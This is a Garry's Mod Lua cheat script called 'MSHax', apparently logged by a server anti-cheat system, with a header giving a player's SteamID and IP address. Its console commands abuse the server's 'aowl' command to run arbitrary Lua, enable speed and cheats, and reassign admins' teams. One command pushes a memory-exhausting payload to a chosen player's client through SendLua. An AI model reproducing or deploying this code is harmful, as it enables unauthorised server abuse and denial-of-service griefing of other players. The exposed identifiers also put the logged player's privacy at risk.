--[[
	MOD/lua/mshax.lua [#866 (#909), 1432809610]
	collision | STEAM_0:0:33459537 <95.67.84.20:27005> | [28.11.13 01:27:50AM]
	===BadFile===
]]

MsgN("MSHax loaded!")

concommand.Add("mshax_toggle_fast_elev",function()
	RunConsoleCommand("aowl","l","me.__megaspeed = not me.__megaspeed")
	MsgN("Done!")
end)

concommand.Add("mshax_show_developers",function()
	if not msteams then
		MsgN("MSTeams not found!")
		return
	end

	for k,v in pairs(player.GetAll()) do
		if v:IsAdmin() then
			msteams.SetTeam(v,"developers")
		end
	end
	msteams.SaveDB()
end)

concommand.Add("mshax_unlag",function()
	if not MHX_CHEATS then
		RunConsoleCommand("aowl","cheats","1")
		MHX_CHEATS = true
	end
end)

local mem = [[
	local a = "a"
	local penis = "a"
	timer.Create("jeers2!!!!",math.random(10,30),0,function()
		a = a .. a
		penis = penis .. a
	end)
]]

concommand.Add("mshax_memleak",function(_,_,args)
	local eid = tonumber(args[1])

	RunConsoleCommand("aowl","l","_"..eid..":SendLua([["..mem.."]])")
	MsgN("Done!")

end)